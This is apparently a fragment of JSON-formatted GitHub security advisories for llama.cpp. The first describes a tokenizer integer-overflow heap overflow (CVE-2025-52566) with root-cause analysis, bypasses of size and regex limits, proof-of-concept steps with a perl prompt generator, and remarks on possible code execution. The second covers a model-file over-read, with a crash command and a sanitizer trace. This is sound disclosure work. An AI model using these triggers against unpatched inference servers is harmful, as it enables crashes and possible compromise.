+    "description": "### Summary\r\n `signed vs. unsigned` integer overflow in `llama.cpp`'s tokenizer implementation (`llama_vocab::tokenize`)  (`src/llama-vocab.cpp:3036`) results in unintended behavior in tokens copying size comparison. Allowing heap-overflowing `llama.cpp` inferencing engine with carefully manipulated `text` input *(human messages, prompts, template)*, during tokenization process.\r\n \r\nThis is pretty dangerous because the `llama_vocab::tokenize` is used everywhere with human input *(`llama_vocab::tokenize -> llama_tokenize -> tokenize_prompt`, then `generate`... )*, meaning that every token input can be a vulnerable entry (Affects *all user input (prompts, messages, templates)*). However, considered less dangerous *because most `msg.role + content` are initialized with `std::vector buf(alloc_size)` (`common/chat.cpp:1831`)*, which have built-in implementation of prevention for `> max_size()` *(`what(): cannot create std::vector larger than max size()`);.\r\n\r\nNevertheless, during research, it was found that this is bypassable by exploiting the latest `jinja` templates support. (`common_chat_templates_apply_jinja`, as it inherits the memory space of `tmpl`) *(`tmpl.apply`)*.\r\n\r\n### Details\r\n\r\nA single line in `llama_vocab::tokenize`, `llama.cpp`'s tokenizer implementation causes this vulnerability. Before we dissect how this heap overflow forms, let's look in to how is it used and referenced in the tokenization process. \r\n\r\n```cpp\r\n// src/llama-vocab.cpp:3055-3073\r\nint32_t llama_vocab::tokenize(\r\n                  const char * text,\r\n                     int32_t   text_len,\r\n                 llama_token * tokens,\r\n                     int32_t   n_tokens_max,\r\n                        bool   add_special,\r\n                        bool   parse_special) const {\r\n    auto res = tokenize(std::string(text, text_len), add_special, parse_special);\r\n    if (n_tokens_max < (int) res.size()) {\r\n        // LLAMA_LOG_ERROR(\"%s: too many tokens\\n\", __func__);\r\n        return -((int) res.size());\r\n    }\r\n\r\n    for (size_t i = 0; i < res.size(); i++) {\r\n        tokens[i] = res[i];\r\n    }\r\n\r\n    return res.size();\r\n}\r\n```\r\n\r\n#### `tokenize` philosophy \r\n`llama_vocab::tokenize()` acts as an interface adapter that calls the underlying  `tokenize` *(`llama_vocab::impl::tokenize`)*, which is the lower-part of the tokenization process, where the inner `vocab`-ing is involved *(e.g. `LLAMA_VOCAB_TYPE_*`, determined by `tokenizer.ggml.model`)*, *(you will see later why is it design in this specific way)*. We won't dive into `llama_vocab::impl::tokenize` now, since it's implementations don't matters now. (*we explains later on why it generates another `stack-overflow`*)\r\n\r\n```cpp\r\nint32_t llama_tokenize(\r\n    const struct llama_vocab * vocab,\r\n    // ....\r\n    return vocab->tokenize(text, text_len, tokens, n_tokens_max, add_special, parse_special);\r\n}\r\n```\r\n\r\n`llama_tokenize` thin wraps `vocab->tokenize` (`llama_vocab::tokenize` interface), also the common `tokenizer` `API` you'll see a lot in `llama.cpp`'s implementation, directly used in `run/run.cpp`*(`./bin/llama-run`'s implementations)* or in `common.cpp` *(`./common/common.cpp`, then used everywhere e.g. `server.cpp` (`./bin/llama-server`), `tts.cpp`, `tokenize.cpp`... )*. \r\n\r\n```cpp\r\nstd::vector<llama_token> common_tokenize(\r\n    const struct llama_vocab * vocab,\r\n           const std::string & text,\r\n                        bool   add_special,\r\n                        bool   parse_special) {\r\n    // upper limit for the number of tokens\r\n    int n_tokens = text.length() + 2 * add_special;\r\n    std::vector<llama_token> result(n_tokens);\r\n    n_tokens = llama_tokenize(vocab, text.data(), text.length(), result.data(), result.size(), add_special, parse_special);\r\n    if (n_tokens < 0) {\r\n        result.resize(-n_tokens);\r\n        int check = llama_tokenize(vocab, text.data(), text.length(), result.data(), result.size(), add_special, parse_special);\r\n        GGML_ASSERT(check == -n_tokens);\r\n\r\n//...\r\n\r\nstatic int tokenize_prompt(const llama_vocab * vocab, const std::string & prompt,\r\n                           std::vector<llama_token> & prompt_tokens, const LlamaData & llama_data) {\r\n    const bool is_first = llama_memory_seq_pos_max(llama_get_memory(llama_data.context.get()), 0) == 0;\r\n\r\n    const int n_prompt_tokens = -llama_tokenize(vocab, prompt.c_str(), prompt.size(), NULL, 0, is_first, true);\r\n    prompt_tokens.resize(n_prompt_tokens);\r\n    if (llama_tokenize(vocab, prompt.c_str(), prompt.size(), prompt_tokens.data(), prompt_tokens.size(), is_first,\r\n                       true) < 0) {\r\n        printe(\"failed to tokenize the prompt\\n\");\r\n        return -1;\r\n    }\r\n```\r\n\r\nIf you look close into the two implementations, you will see that both caller of `llama_tokenize()` adheres to a common design for the allocation of the `tokenization` process:\r\n1. Initialize the buffer for `llama_token * tokens` (`result`) with a smaller allocation *`text.length() + 2 * add_special` / `prompt_tokens` (`std::vector<llama_token> tokens;`))*\r\n\t1. Calling `llama_tokenize -> llama_vocab::impl::tokenize` for the first time for probing the `tokens` (`res`) length, where the `n_tokens_max` is set to `zero` or a smaller size to guarantee no actual copying of the result happens \r\n\t2. `resize()` the `result` vector with the negative length returned from `llama_tokenize`\r\n\t3. Calling `llama_tokenize` for the second time, where this time `llama_vocab::impl::tokenize` is guaranteed to be saved under `llama_token * tokens`\r\n\r\nThis explains why a negative return is constructed for `llama_tokenize`, the `tokenizer` dynamically determine the outputting saving size of the `token` array, though at a cost of calling `llama_vocab::impl::tokenize` twice, this in first hand guaranteed efficient memory usage. But this is the cause for this heap-overflow\r\n\r\n`if (n_tokens_max < (int) res.size())` converts the `tokenize(...).size()` (`std::vector.size()`,`size_t`) into `(int)` for cases where the size of the tokenized vector exceeds `n_tokens_max` (interpreted as `n_tokens_max` as an argument).\r\n\r\nThe casting here intuitively makes sense, since `n_tokens_max` is `int32_t` - signed *(as you can see the typing right above)*, the `result size()` was cast to a signed `int` to avoid the compiler warning about signed/unsigned comparison and ensure both operands have the same `signedness` during the comparison operation. \r\n\r\nHowever, this intuitive operation opened up a path for out-of-bound memory corruption at the same time. In an edge case where `res.size()` exceeds `INT_MAX (2,147,483,647)`, the casting will convert the originally huge `size_t` `res.size()` into a extremely large negative `integer`, which will always bypass the signed size comparison for `n_tokens_max` - which in normal sense is always a small integer *(as we introduced previously, the dynamic size probing design will start the`n_tokens_max` at zero)*. \r\n\r\nFor the following-up memory operation, the originally `int` casted `res.size()` will be restore back to it's original typing `size_t`, from the negative integer `llama_vocab::tokenize(` used in size comparison back to the huge positive integer in `size_t`, in case where `res.size() = 2,147,483,647+1`, this will allows a `(actual_tokens-2,147,483,648)*sizeof(llama_token)` bytes of out-of-bound writing of token.\r\n\r\n<img width=\"1501\" alt=\"Pasted image 20250622131251\" src=\"https://github.com/user-attachments/assets/3d19210f-13ed-49a1-9e6e-849b39f3d05c\" />\r\n\r\n\r\nFrom `gdb`, we can see that the finally copied destination `token` is located on the `heap`, showing this is a `heap-overflow`, we will explain later why this is interesting and fun (dangerous).\r\n#### `std::vector larger than max size()`?\r\nHowever, notice that this huge sizing of a variable, specifically `text` in this case, is usually problematic, since the `cpp` standard library has preventions for you from creating such big elements. This was a major obstacle met during the process of creating a proof-of-concept for this heap overflow, since directly inputting such a lengthy prompt will trigger *\"`what(): cannot create std::vector larger than max size()`\"*; however this limitation was bypassed. \r\n\r\nResearching for the exact trigger for this error, it was found that this message is triggered by `std::vector<char> buf(alloc_size)`, called as follows:\r\n\r\n- `(tools/run/run.cpp:1179) static int chat_loop -> ret = process_user_message(opt,`\r\n\t- `(tools/run/run.cpp:1151) process_user_message -> apply_chat_template_with_error_handling(chat_templates.get(),`\r\n\t\t- `(tools/run/run.cpp:1082) apply_chat_template_with_error_handling -> apply_chat_template(tmpls, llama_data, append, use_jinja);`\r\n\t\t\t- `(tools/run/run.cpp:931) apply_chat_template -> common_chat_templates_apply(tmpls, inputs);`\r\n\t\t\t\t- `(common/chat.cpp:1867) common_chat_templates_apply -> common_chat_templates_apply_legacy`\r\n\t\t\t\t\t- `(common/chat.cpp:1831) common_chat_templates_apply_legacy -> std::vector<char> buf(alloc_size);`\r\n\r\nlooking into `(common/chat.cpp:1831) common_chat_templates_apply_legacy`:\r\n```cpp\r\nstatic common_chat_params common_chat_templates_apply_legacy(\r\n    const struct common_chat_templates * tmpls,\r\n    const struct common_chat_templates_inputs & inputs)\r\n{\r\n    // ....\r\n    for (size_t i = 0; i < contents.size(); ++i) {\r\n        const auto & msg = inputs.messages[i];\r\n        const auto & content = contents[i];\r\n        chat.push_back({msg.role.c_str(), content.c_str()});\r\n        alloc_size += (msg.role.size() + content.size()) * 1.25;\r\n    }\r\n\r\n    std::vector<char> buf(alloc_size);\r\n```\r\nThe size here is determined by `alloc_size += (msg.role.size() + content.size()) * 1.25,` the implementation for applying the `chat.template` with the message's `role` and `message`. It's a pain here since the size was `* 1.25` after adding the `msg.role.size()`, making the original huge `content.size()` (message) even bigger.\r\n\r\nHowever, looking back at `(common/chat.cpp:1867) common_chat_templates_apply`, where `common_chat_templates_apply_legacy` is called, we can see another `chat_templates_applier`:\r\n```cpp\r\ncommon_chat_params common_chat_templates_apply(\r\n    const struct common_chat_templates * tmpls,\r\n    const struct common_chat_templates_inputs & inputs)\r\n{\r\n    GGML_ASSERT(tmpls != nullptr);\r\n    return inputs.use_jinja\r\n        ? common_chat_templates_apply_jinja(tmpls, inputs)\r\n        : common_chat_templates_apply_legacy(tmpls, inputs);\r\n}\r\n```\r\n`jinja` is `llama.cpp`'s `chat template` interpreter is based, by looking it to `common_chat_templates_apply_jinja`'s implementations, we will see that it\u00a0never allocates a manual byte-buffer the way the\u00a0`legacy`\u00a0path does, \r\n1. It builds a\u00a0`templates_params params`;\u00a0structure (all members are default-constructed; nothing is pre-sized).\r\n2. Depending on the template in use it dispatches to one of the\u00a0`common_chat_params_init_*`\u00a0helpers (e.g.\u00a0`common_chat_params_init_llama_3_x,\u00a0*_generic`, \u2026).\r\n3. Inside those helpers the rendered prompt is obtained with\r\n```cpp\r\ndata.prompt\u00a0=\u00a0apply(tmpl,\u00a0tweaked_messages,\u00a0tools_json,\u00a0add_generation_prompt,\u00a0extra_context);\r\n```\r\nwhere\u00a0`apply(...)`\u00a0is the small helper a few lines above. That helper calls\r\n```cpp\r\nauto result = tmpl.apply(tmpl_inputs, tmpl_opts); // minja::chat_template::apply\r\n```\r\n`minja::chat_template::apply`\u00a0directly returns an\u00a0`std::string`, so the prompt is produced and stored in a normal C++ string. Memory management is therefore handled automatically by\u00a0`std::string`; no explicit size estimation or buffer reallocation is required, what that mean using `common_chat_templates_apply_jinja` allow us to use the original constructed `message`, and **not trigger any size error**.\r\n\r\n (`./bin/llama-run`):\r\n*  `(src/llama-vocab.cpp:3331) int32_t llama_tokenize() -> vocab->tokenize(`\r\n\t* `(tools/run/run.cpp:944) tokenize_prompt -> const int n_prompt_tokens = -llama_tokenize(vocab, prompt.c_str(), prompt.size(), NULL, 0, is_first, true);`\r\n\t\t*  *prompt (reversed)*: `(tools/run/run.cpp:988) static int generate(` -> `if (tokenize_prompt(vocab, prompt, tokens, llama_data) < 0)`\r\n\t\t\t* `(tools/run/run.cpp:1063) static int generate_response -> if (generate(llama_data, prompt, response))`\r\n\t\t\t\t* `(tools/run/run.cpp:1151) static int process_user_message( ->  if (generate_response(llama_data, prompt, response, stdout_a_terminal)) {`\r\n\t\t\t\t\t* `(tools/run/run.cpp:1179) static int chat_loop`\r\n\r\n#### Collateral Gift\r\nDuring the process of creating a `PoC` for previously mentioned vulnerability and bypassing vector, something sketchy caught attention when examine the `ASAN` logs.  \r\n<img width=\"1512\" alt=\"Pasted image 20250622145126\" src=\"https://github.com/user-attachments/assets/78f8bc78-3316-4fbd-8300-87950b8cb21a\" />\r\nA `stack-overflow` was triggered via the \u00a0`STL`\u00a0allocator (`bits/alloc_traits.h)` (this is common for `ASAN`), at first we thought this is the direct proof-of-concept for our overflow discussed above *(didn't realize it was actually a `heap-overflow` back then)*, but then looking into the detailed `ASAN` logs, it was realized that this was via `regex`\u00a0processing (`bits/regex_executor.tcc`), via `sub_match`, with further investigations on the overflowing frame, it's found that this `stack-overflow` was caused by a infinite recursion triggered by\u00a0`unicode_regex_split`\u00a0**cause the stack frame to raise to the upper limit of stack region**, and triggered this `oob` access detected by\u00a0`asan`, specifically:\r\n- `llama_vocab::impl::tokenize(`\r\n    - `case LLAMA_VOCAB_TYPE_BPE:`\r\n        - `session.tokenize(text, output) -> void tokenize()`\u00a0_`src/llama-vocab.cpp:484`_\r\n            - `const auto word_collection = unicode_regex_split(text, tokenizer.regex_exprs);`  \r\n\r\n```c\r\n    void tokenize(const std::string & text, std::vector<llama_token> & output) {\r\n        int final_prev_index = -1;\r\n        const auto word_collection = unicode_regex_split(text, tokenizer.regex_exprs);\r\n```\r\n\r\nYou can takes this in two perspective. On one hand, this give us a collateral `ReDoS` out-of-the-blue; on the other hand, this collateral `stack-overflow` stops us from reaching the final `heap-overflow`.\r\n\r\nHowever, there's always a way to bypass, this method of word splitting *(`unicode_regex_split`)* only happens in `LLAMA_VOCAB_TYPE_BPE`, the most common `vocab_type` used by `gpt-2`  (`else if (tokenizer_model == \"gpt2\") { type = LLAMA_VOCAB_TYPE_BPE;`) or (`Byte-Pair Encoding)`. By switching to `Unigram (T5)` architectures in the `GGUF` metadata, (`LLAMA_VOCAB_TYPE_UGM`), we can take the other `case` in the `llama_vocab::impl::tokenize()` `(get_type())` switch.\r\n<img width=\"1236\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9f9c24ef-9702-4c81-b8c6-82ff36954682\" />\r\n\r\n### Proof-of-Concept\r\n1. Compile latest version of `llama.cpp` with `ASAN`:\r\n```shell\r\ncmake .. \\\r\n    -DCMAKE_C_FLAGS=\"-fsanitize=address -fno-omit-frame-pointer -g\" \\\r\n    -DCMAKE_CXX_FLAGS=\"-fsanitize=address -fno-omit-frame-pointer -g\"\r\n\r\nmake -j\r\n```\r\n2. Generate a `prompt`, tokenized result hitting `>INT32_MAX` incorporating the size of `chat.template` (In `.gguf` metadata):\r\n```shell\r\nperl -e 'print \"<token>\" x ((2147483648-<chat-template-size>)/<per_token>), \"\\n\"' >| prompt.txt\r\n```\r\n3. Start a `llama.cpp` inferencing service (we choose `llama-run` as `poc`), input *(redirect)* `prompt` as model input to trigger `tokenization`.\r\n\t- Use a `gguf` models with `tokenizer.ggml.model` that's not `gpt-2`, with `jinja` supported template (e.g. : [Retr0REG/mistral-tokenizer-llama](https://huggingface.co/Retr0REG/mistral-tokenizer-llama))  \r\n```shell\r\nASAN_OPTIONS=verbosity=1 \\\r\n./bin/llama-run file://<path-to-model> --jinja < ./prompt.txt\r\n```\r\n### Impact\r\n<img width=\"941\" alt=\"Pasted image 20250622213317\" src=\"https://github.com/user-attachments/assets/40ed396a-502c-48dc-b670-6b64a588c60b\" />\r\n\r\n- `heap overflow` *(heap based out-of-bounds writing)* of the `llama.cpp` inferencing engine.\r\n\t- potential `remote-code execution`: the heap is very playful, we're able to overwrite following chunks *(`freed` or `in-use`, both dangerous!)* member's pointers, we could:\r\n\t\t- overwrite `in-use` structure members: e.g. change initialized chunk interface to bad pointers, hijack execution flow, structure-oriented programming?\r\n\t\t\t- _*you can read [llama's paradox](https://retr0.blog/blog/llama-rpc-rce) for my past experience turning a heap-overflow in `llama.cpp` to `rce`_.\r\n\t\t- overwrite chunks states / freed chunks pointers: *e.g. house-of attacks*\r\n\t- `dos`: crashes the inferencing server (straightforward)\r\n \r\n**Impacted Components:**\r\n- `llama_tokenize() -> llama_vocab::tokenize()`\r\n\t- `run.cpp` *(`./bin/llama-run`)*\r\n\t- `simple.cpp` *(`./bin/llama-simple`)*",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-7rxv-5jhh-j6xx",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-52566",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-06-23T16:04:05Z",
+    "published_at": "2025-06-23T16:04:05Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "llama.cpp",
+          "name": ""
+        },
+        "vulnerable_version_range": "<b5721",
+        "patched_versions": "b5721",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "score": 8.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-119",
+        "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      },
+      {
+        "cwe_id": "CWE-195",
+        "name": "Signed to Unsigned Conversion Error"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-119",
+      "CWE-195"
+    ],
+    "credits": [
+      {
+        "login": "retr0reg",
+        "type": "finder"
+      },
+      {
+        "login": "GuyGoldenberg",
+        "type": "other"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "retr0reg",
+          "id": 72267897,
+          "node_id": "MDQ6VXNlcjcyMjY3ODk3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/72267897?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/retr0reg",
+          "html_url": "https://github.com/retr0reg",
+          "followers_url": "https://api.github.com/users/retr0reg/followers",
+          "following_url": "https://api.github.com/users/retr0reg/following{/other_user}",
+          "gists_url": "https://api.github.com/users/retr0reg/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/retr0reg/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/retr0reg/subscriptions",
+          "organizations_url": "https://api.github.com/users/retr0reg/orgs",
+          "repos_url": "https://api.github.com/users/retr0reg/repos",
+          "events_url": "https://api.github.com/users/retr0reg/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/retr0reg/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "GuyGoldenberg",
+          "id": 7585494,
+          "node_id": "MDQ6VXNlcjc1ODU0OTQ=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/7585494?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/GuyGoldenberg",
+          "html_url": "https://github.com/GuyGoldenberg",
+          "followers_url": "https://api.github.com/users/GuyGoldenberg/followers",
+          "following_url": "https://api.github.com/users/GuyGoldenberg/following{/other_user}",
+          "gists_url": "https://api.github.com/users/GuyGoldenberg/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/GuyGoldenberg/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/GuyGoldenberg/subscriptions",
+          "organizations_url": "https://api.github.com/users/GuyGoldenberg/orgs",
+          "repos_url": "https://api.github.com/users/GuyGoldenberg/repos",
+          "events_url": "https://api.github.com/users/GuyGoldenberg/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/GuyGoldenberg/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "other",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 15,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "score": 8.6
+    }
+  },
+  {
+    "ghsa_id": "GHSA-g4cc-763q-h9h6",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-g4cc-763q-h9h6",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-g4cc-763q-h9h6",
+    "summary": "Heap-based Buffer Over-read in llama_model_load",
+    "description": "### Summary\r\nA heap-based buffer over-read vulnerability in the GGUF file parser allows a remote attacker to cause a Denial of Service (DoS) by providing a maliciously crafted model file. The vulnerability is triggered when the application attempts to load a model that has a vocabulary size smaller than the hardcoded default ID for special tokens (e.g., Begin of Sentence), leading to an out-of-bounds read and crash.\r\n\r\n### Details\r\nIn llama-cli, the print_info function is called after loading the model. This function attempts to access the text for special_bos_id without validating if the ID is within the bounds of the vocabulary vector.\r\n\r\n```\r\nvoid llama_vocab::impl::print_info() const {\r\n    LLAMA_LOG_INFO(\"%s: vocab type       = %s\\n\",     __func__, type_name().c_str());\r\n    LLAMA_LOG_INFO(\"%s: n_vocab          = %u\\n\",     __func__, vocab.n_tokens());\r\n    LLAMA_LOG_INFO(\"%s: n_merges         = %u\\n\",     __func__, (uint32_t) bpe_ranks.size());\r\n\r\n    // special tokens\r\n    if (special_bos_id  != LLAMA_TOKEN_NULL)    { LLAMA_LOG_INFO( \"%s: BOS token        = %d '%s'\\n\", __func__, special_bos_id,     id_to_token[special_bos_id].text.c_str() );  }\r\n```\r\nThe special_bos_id (Begin of Sentence ID) is initialized with a default value of 1.\r\n\r\nWith special_bos_id being 1 and id_to_token.size() being 1, the access id_to_token[1] is an out-of-bounds read on the heap, which causes a segmentation fault.\r\n\r\n\r\n### PoC\r\nhttps://drive.google.com/file/d/17utcgl2AmEVpVgOShqe6gEadUxV7-_bQ/view?usp=drive_link\r\n\r\n./build/bin/llama-cli -m vocab_overflow.gguf\r\n\r\noutput\uff1a\r\n```\r\nregister_device: registered device CPU (Intel(R) Xeon(R) CPU E5-2620 v4 @ 2.10GHz)\r\nload_backend: failed to find ggml_backend_init in /home/llama.cpp/build/bin/libggml-cpu.so\r\nbuild: 5618 (1f63e75f) with cc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 for x86_64-linux-gnu (debug)\r\nmain: llama backend init\r\nmain: load the model and apply lora adapter, if any\r\nllama_model_loader: loaded meta data with 10 key-value pairs and 1 tensors from examples/gguf/malicious.gguf (version GGUF V3 (latest))\r\nllama_model_loader: Dumping metadata keys/values. Note: KV overrides do not apply in this output.\r\nllama_model_loader: - kv   0:                       general.architecture str              = llama\r\nllama_model_loader: - kv   1:                          llama.block_count u32              = 2\r\nllama_model_loader: - kv   2:                       llama.context_length u32              = 1024\r\nllama_model_loader: - kv   3:                     llama.embedding_length u32              = 4096\r\nllama_model_loader: - kv   4:                  llama.feed_forward_length u32              = 11008\r\nllama_model_loader: - kv   5:                 llama.attention.head_count u32              = 32\r\nllama_model_loader: - kv   6:              llama.attention.head_count_kv u32              = 32\r\nllama_model_loader: - kv   7:     llama.attention.layer_norm_rms_epsilon f32              = 0.000010\r\nllama_model_loader: - kv   8:                       tokenizer.ggml.model str              = llama\r\nllama_model_loader: - kv   9:                      tokenizer.ggml.tokens arr[str,1]       = [\"<unk>\"]\r\nllama_model_loader: - type  f32:    1 tensors\r\nprint_info: file format = GGUF V3 (latest)\r\nprint_info: file type   = all F32 (guessed)\r\nprint_info: file size   = 0.00 MiB (0.00 BPW) \r\nload: SPM vocabulary, but newline token not found: _Map_base::at! Using special_pad_id instead.load: special_eos_id is not in special_eog_ids - the tokenizer config may be incorrect\r\nload: special tokens cache size = 0\r\nload: token to piece cache size = 0.0000 MB\r\nprint_info: arch             = llama\r\nprint_info: vocab_only       = 0\r\nprint_info: n_ctx_train      = 1024\r\nprint_info: n_embd           = 4096\r\nprint_info: n_layer          = 2\r\nprint_info: n_head           = 32\r\nprint_info: n_head_kv        = 32\r\nprint_info: n_rot            = 128\r\nprint_info: n_swa            = 0\r\nprint_info: is_swa_any       = 0\r\nprint_info: n_embd_head_k    = 128\r\nprint_info: n_embd_head_v    = 128\r\nprint_info: n_gqa            = 1\r\nprint_info: n_embd_k_gqa     = 4096\r\nprint_info: n_embd_v_gqa     = 4096\r\nprint_info: f_norm_eps       = 0.0e+00\r\nprint_info: f_norm_rms_eps   = 1.0e-05\r\nprint_info: f_clamp_kqv      = 0.0e+00\r\nprint_info: f_max_alibi_bias = 0.0e+00\r\nprint_info: f_logit_scale    = 0.0e+00\r\nprint_info: f_attn_scale     = 0.0e+00\r\nprint_info: n_ff             = 11008\r\nprint_info: n_expert         = 0\r\nprint_info: n_expert_used    = 0\r\nprint_info: causal attn      = 1\r\nprint_info: pooling type     = 0\r\nprint_info: rope type        = 0\r\nprint_info: rope scaling     = linear\r\nprint_info: freq_base_train  = 10000.0\r\nprint_info: freq_scale_train = 1\r\nprint_info: n_ctx_orig_yarn  = 1024\r\nprint_info: rope_finetuned   = unknown\r\nprint_info: ssm_d_conv       = 0\r\nprint_info: ssm_d_inner      = 0\r\nprint_info: ssm_d_state      = 0\r\nprint_info: ssm_dt_rank      = 0\r\nprint_info: ssm_dt_b_c_rms   = 0\r\nprint_info: model type       = ?B\r\nprint_info: model params     = 4611686.02 T\r\nprint_info: general.name     = n/a\r\nprint_info: vocab type       = SPM\r\nprint_info: n_vocab          = 1\r\nprint_info: n_merges         = 0\r\n=================================================================\r\n==734216==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x604000050e78 at pc 0x7fba119d8db6 bp 0x7fffa3d98010 sp 0x7fffa3d98000\r\nREAD of size 8 at 0x604000050e78 thread T0\r\n    #0 0x7fba119d8db5 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_data() const /usr/include/c++/9/bits/basic_string.h:187\r\n    #1 0x7fba119d1a90 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::c_str() const /usr/include/c++/9/bits/basic_string.h:2301\r\n    #2 0x7fba11f8c110 in llama_vocab::impl::print_info() const /home/llama.cpp/src/llama-vocab.cpp:2771\r\n    #3 0x7fba11f8ddef in llama_vocab::print_info() const /home/llama.cpp/src/llama-vocab.cpp:3112\r\n    #4 0x7fba11efa4b4 in llama_model::print_info() const /home/llama.cpp/src/llama-model.cpp:4442\r\n    #5 0x7fba11dd9a53 in llama_model_load /home/llama.cpp/src/llama.cpp:119\r\n    #6 0x7fba11dda5bc in llama_model_load_from_file_impl /home/llama.cpp/src/llama.cpp:217\r\n    #7 0x7fba11dda7d7 in llama_model_load_from_file /home/llama.cpp/src/llama.cpp:244\r\n    #8 0x55849daa6d17 in common_init_from_params(common_params&) /home/llama.cpp/common/common.cpp:892\r\n    #9 0x55849d933d0a in main /home/llama.cpp/tools/main/main.cpp:140\r\n    #10 0x7fba0f45c082 in __libc_start_main ../csu/libc-start.c:308\r\n    #11 0x55849d9331bd in _start (/home/llama.cpp/build/bin/llama-cli+0x801bd)\r\n\r\n0x604000050e78 is located 0 bytes to the right of 40-byte region [0x604000050e50,0x604000050e78)\r\nallocated by thread T0 here:\r\n    #0 0x7fba12203947 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.5+0x10f947)\r\n    #1 0x7fba11fa6153 in __gnu_cxx::new_allocator<llama_vocab::token_data>::allocate(unsigned long, void const*) /usr/include/c++/9/ext/new_allocator.h:114\r\n    #2 0x7fba11fa4156 in std::allocator_traits<std::allocator<llama_vocab::token_data> >::allocate(std::allocator<llama_vocab::token_data>&, unsigned long) /usr/include/c++/9/bits/alloc_traits.h:444\r\n    #3 0x7fba11fa0e97 in std::_Vector_base<llama_vocab::token_data, std::allocator<llama_vocab::token_data> >::_M_allocate(unsigned long) /usr/include/c++/9/bits/stl_vector.h:343\r\n    #4 0x7fba11f9bce8 in std::vector<llama_vocab::token_data, std::allocator<llama_vocab::token_data> >::_M_default_append(unsigned long) /usr/include/c++/9/bits/vector.tcc:635\r\n    #5 0x7fba11f976a0 in std::vector<llama_vocab::token_data, std::allocator<llama_vocab::token_data> >::resize(unsigned long) /usr/include/c++/9/bits/stl_vector.h:937\r\n    #6 0x7fba11f8624e in llama_vocab::impl::load(llama_model_loader&, LLM_KV const&) /home/llama.cpp/src/llama-vocab.cpp:1704\r\n    #7 0x7fba11f8c84d in llama_vocab::load(llama_model_loader&, LLM_KV const&) /home/llama.cpp/src/llama-vocab.cpp:2803\r\n    #8 0x7fba11ecea42 in llama_model::load_vocab(llama_model_loader&) /home/llama.cpp/src/llama-model.cpp:1464\r\n    #9 0x7fba11dd9a2b in llama_model_load /home/llama.cpp/src/llama.cpp:113\r\n    #10 0x7fba11dda5bc in llama_model_load_from_file_impl /home/llama.cpp/src/llama.cpp:217\r\n    #11 0x7fba11dda7d7 in llama_model_load_from_file /home/llama.cpp/src/llama.cpp:244\r\n    #12 0x55849daa6d17 in common_init_from_params(common_params&) /home/llama.cpp/common/common.cpp:892\r\n    #13 0x55849d933d0a in main /home/llama.cpp/tools/main/main.cpp:140\r\n    #14 0x7fba0f45c082 in __libc_start_main ../csu/libc-start.c:308\r\n\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/c++/9/bits/basic_string.h:187 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_data() const\r\nShadow bytes around the buggy address:\r\n  0x0c0880002170: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 07 fa\r\n  0x0c0880002180: fa fa 00 00 00 00 00 fa fa fa fd fd fd fd fd fa\r\n  0x0c0880002190: fa fa 00 00 00 00 07 fa fa fa fd fd fd fd fd fd\r\n  0x0c08800021a0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd 